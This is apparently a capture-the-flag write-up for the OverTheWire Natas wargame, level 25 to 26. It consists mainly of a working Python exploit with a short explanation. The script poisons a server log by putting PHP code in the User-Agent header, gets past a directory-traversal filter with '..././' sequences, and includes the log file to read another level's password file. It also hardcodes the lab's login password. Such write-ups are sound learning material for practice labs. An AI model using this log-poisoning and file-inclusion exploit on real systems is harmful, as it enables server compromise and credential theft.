# Level 25 -> Level 26

```python
import requests

target = 'http://natas25.natas.labs.overthewire.org'
auth = ('natas25', "ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws")

cookies = dict()

params = dict(lang='natas_webpass')

headers = {
        "User-Agent": '<?php echo file_get_contents("/etc/natas_webpass/natas26"); ?>'
}

r = requests.get(target, auth=auth, params=params, cookies=cookies, headers=headers)
phpsessid = r.cookies['PHPSESSID']
log_file = '/var/www/natas/natas25/logs/natas25_%s.log' % phpsessid
cookies = dict(PHPSESSID=phpsessid)

params = dict(lang=('..././..././..././..././..././' + log_file))
r = requests.get(target, auth=auth, params=params, cookies=cookies, headers=headers)
print(r.text)
```

we change the lang parameter to include a file that doesn't exist in the path so that it triggers the log file  
we inject php code onto the  User Agent header which is stored on to the log file so that when the log file is read, our code executes  
we read the log file using lang parameter by bypassing the directory traversal checks using **..././**  

